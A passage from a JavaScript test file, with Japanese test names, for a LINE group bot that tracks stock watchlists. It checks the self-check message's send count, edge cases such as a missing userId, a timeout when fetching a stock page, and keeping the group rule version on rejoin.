      if (/^function /.test(line)) assert.match(lines[i - 1].trim(), /^\/\/|\*\/$/, f + "：" + line);
    });
  });
});

test("#テスト の 🩺 自己点検に、今月の LINE の送信数が出る（読むだけ）", () => {
  const gas = make();
  const message = fresh(gas).call("buildAdminTestSelfCheckMessage_");
  assert.match(message.text, /✅ \[送信数\] 今月 10 通 ／ 上限 200 通（のこり 190）/);
});

// ---- 端の場合（2026-10-29 の見直し） ----

test("ボタンを押した人の userId がわからないときは、記録せずに返す", () => {
  const gas = make();
  const before = JSON.stringify(gas.rows("MEMBERS"));
  event(gas, { type: "postback", replyToken: "r", source: { type: "group", groupId: GROUP }, postback: { data: "action=agree_rules&ruleVersion=1" } });
  assert.equal(JSON.stringify(gas.rows("MEMBERS")), before, "空の人を MEMBERS に書かない");
  assert.equal(gas.call("getAllowedUserIds_").includes(""), false);
  assert.equal(gas.replies().length, 1, "黙らない");
});

test("株価のページにまったくつながらないときは、コードのまちがいとは言わない", () => {
  const g = createGas({
    dir: path.join(__dirname, "../src"),
    properties: { SPREADSHEET_ID: "SPREADSHEET_TEST", LINE_CHANNEL_ACCESS_TOKEN: "t", WEBHOOK_KEY: "hook-secret", ALLOWED_GROUP_IDS: GROUP, ALLOWED_USER_IDS: MEMBER },
    fetch: (url, opt) => {
      if (/google\.com\/finance/.test(url)) throw new Error("Timeout");
      return lineFetch(url, opt);
    },
  });
  setupSheets(g);
  g.reset();
  text(g, "#7203");
  assert.doesNotMatch(replyTexts(g), /コードを確かめて/);
  assert.match(replyTexts(g), /つながりませんでした/);
  assert.equal(g.rows("WATCHLIST").length, 1, "注目には入れない");
});

test("#グループ許可・入りなおしで、グループのルールの版を 1 にもどさない", () => {
  const gas = make();
  const hdr = gas.rows("GROUPS")[0];
  gas.seed("GROUPS", [hdr, [GROUP, "投資の会", true, 2, "2026-10-01 09:00:00", "2026-10-01 09:00:00"]]);
  text(gas, "#グループ許可", ADMIN);
  event(gas, { type: "join", replyToken: "j", source: { type: "group", groupId: GROUP } });
  assert.equal(Number(gas.rows("GROUPS")[1][3]), 2);
});
